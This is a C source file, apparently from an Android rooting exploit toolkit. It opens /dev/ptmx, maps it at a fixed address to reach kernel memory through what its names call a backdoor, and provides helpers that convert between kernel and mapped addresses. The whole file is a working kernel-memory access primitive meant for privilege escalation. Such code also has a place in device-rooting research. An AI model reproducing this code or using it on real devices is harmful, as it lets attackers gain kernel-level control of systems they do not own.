#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

#include "backdoor_mmap.h"

#define MMAP_DEVICE     "/dev/ptmx"

#define KERNEL_BASE_ADDRESS   0xc0008000

static int ptmx_mmap_fd = -1;
static void *ptmx_mmap_address;

void *
backdoor_convert_to_kernel_address(void *address)
{
  return address - BACKDOOR_MMAP_ADDRESS + KERNEL_BASE_ADDRESS;
}

void *
backdoor_convert_to_mmaped_address(void *address)
{
  return address - KERNEL_BASE_ADDRESS + BACKDOOR_MMAP_ADDRESS;
}

bool
backdoor_open_mmap(void)
{
  if (ptmx_mmap_fd >= 0)
    return false;

  ptmx_mmap_fd = open(MMAP_DEVICE, O_RDWR);
  if (ptmx_mmap_fd < 0) {
    return false;
  }

  ptmx_mmap_address = mmap((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE,
                           PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, ptmx_mmap_fd, 0);

  if (ptmx_mmap_address == MAP_FAILED) {
    close(ptmx_mmap_fd);
    ptmx_mmap_fd = -1;

    return false;
  }

  return true;
}

bool
backdoor_close_mmap(void)
{
  if (ptmx_mmap_fd < 0)
    return false;

  munmap(ptmx_mmap_address, BACKDOOR_MMAP_SIZE);

  close(ptmx_mmap_fd);
  ptmx_mmap_fd = -1;

  return true;
}
